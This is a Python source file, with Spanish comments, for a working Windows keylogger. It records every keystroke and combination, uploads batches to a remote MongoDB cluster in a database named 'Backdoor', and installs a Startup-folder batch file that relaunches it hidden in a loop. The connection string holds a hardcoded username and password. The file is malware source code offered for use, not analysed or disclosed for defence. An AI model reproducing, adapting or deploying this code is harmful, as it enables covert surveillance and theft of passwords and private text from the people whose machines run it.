import os
import threading
import time
from pymongo import MongoClient
from pynput import keyboard
import datetime

# Configuración de MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["Backdoor"]
collection = db["keylogger"]

# Variables de control
keystrokes = []
session_id = datetime.datetime.utcnow().isoformat()
start_time = time.time()
max_chars_per_batch = 100  # Número de caracteres antes de guardar
max_idle_time = 600        # Tiempo máximo de inactividad para iniciar una nueva sesión
save_interval = 300        # Intervalo de guardado automático en segundos (5 minutos)
last_saved = time.time()   # Último tiempo de guardado
teclas_presionadas = set()
combinacion_actual = []

# Función para categorizar las teclas presionadas
def categorize_key(key):
    """Clasifica teclas en caracteres normales y especiales."""
    try:
        return {'type': 'character', 'value': key.char}
    except AttributeError:
        special_keys = {
            keyboard.Key.space: 'ESPACIO',
            keyboard.Key.enter: 'ENTER',
            keyboard.Key.tab: 'TAB',
            keyboard.Key.backspace: 'RETROCESO',
            keyboard.Key.shift: 'SHIFT',
            keyboard.Key.ctrl: 'CTRL',
            keyboard.Key.alt: 'ALT',
            keyboard.Key.esc: 'ESCAPE',
            keyboard.Key.delete: 'DELETE',
            keyboard.Key.up: 'ARRIBA',
            keyboard.Key.down: 'ABAJO',
            keyboard.Key.left: 'IZQUIERDA',
            keyboard.Key.right: 'DERECHA',
            keyboard.Key.caps_lock: 'BLOQ_MAYUS',
            keyboard.Key.cmd: 'WINDOWS'
        }
        return {'type': 'special', 'value': special_keys.get(key, str(key))}

# Función que maneja la pulsación de teclas
def on_press(key):
    """Registra las teclas presionadas y sus combinaciones."""
    global start_time, teclas_presionadas
    
    categorized_key = categorize_key(key)
    teclas_presionadas.add(str(key))
    
    # Crear combinación de teclas si hay más de una tecla presionada
    if len(teclas_presionadas) > 1:
        combinacion = " + ".join(sorted(teclas_presionadas))
        keystrokes.append({
            'type': 'combination',
            'value': combinacion,
            'keys': list(teclas_presionadas)
        })
    else:
        keystrokes.append(categorized_key)
    
    start_time = time.time()

# Función para guardar los datos de las teclas presionadas
def save_keystrokes():
    """Guarda las teclas en MongoDB y en el archivo local cada cierto tiempo."""
    global start_time, last_saved
    while True:
        time.sleep(5)  # Revisa las condiciones cada 5 segundos

        if keystrokes and (len(keystrokes) >= max_chars_per_batch or (time.time() - last_saved) >= save_interval):
            # Guardar en la base de datos
            timestamp = datetime.datetime.utcnow()
            collection.insert_one({
                "session_id": session_id,
                "timestamp": timestamp,
                "keystrokes": keystrokes.copy()  # Copia para evitar conflictos
            })

            # Guardar en archivo local
            output_file = f'C:\\Users\\{os.getlogin()}\\Desktop\\jarvis_data\\keystrokes_{timestamp}.txt'
            os.makedirs(os.path.dirname(output_file), exist_ok=True)
            with open(output_file, 'a') as file:
                for record in keystrokes:
                    file.write(f"{record['value']}")
            
            # Reiniciar las teclas y actualizar el tiempo
            keystrokes.clear()
            last_saved = time.time()

        # Si hay inactividad, reinicia la sesión
        if (time.time() - start_time) >= max_idle_time:
            start_new_session()

# Función para iniciar una nueva sesión (cuando hay inactividad)
def start_new_session():
    """Inicia una nueva sesión de captura cuando el usuario está inactivo por un tiempo determinado."""
    global session_id
    session_id = datetime.datetime.utcnow().isoformat()

# Función para crear un archivo de inicio automático (si es necesario)
def create_startup_file():
    bat_content = f'''@echo off
                        where python >nul 2>nul
                        if %ERRORLEVEL% neq 0 (
                            echo Python no está instalado. Instale Python.
                            exit /b
                        )

                        python -m pip install --upgrade pip
                        pip install pynput pymongo

                        set "PYTHON_SCRIPT={os.path.abspath(__file__)}"
                        powershell -windowstyle hidden -command "try {{ python '{os.path.abspath(__file__)}' }} catch {{ exit 1 }}"

                        :inicio
                        python %PYTHON_SCRIPT%
                        goto inicio
'''
    bat_file_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_keylogger.bat')
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f'Archivo de inicio creado en: {bat_file_path}')

# Función para manejar la liberación de teclas
def on_release(key):
    """Maneja la liberación de teclas."""
    global teclas_presionadas
    try:
        teclas_presionadas.remove(str(key))
    except KeyError:
        pass

# Función principal del keylogger
def main():
    """Configuración principal del keylogger y ejecución de los hilos."""
    start_new_session()
    save_thread = threading.Thread(target=save_keystrokes)
    save_thread.daemon = True
    save_thread.start()

    # Iniciar el listener de teclado con el manejador de liberación de teclas
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    if not os.path.isfile(os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_keylogger.bat')):
        create_startup_file()
    main()
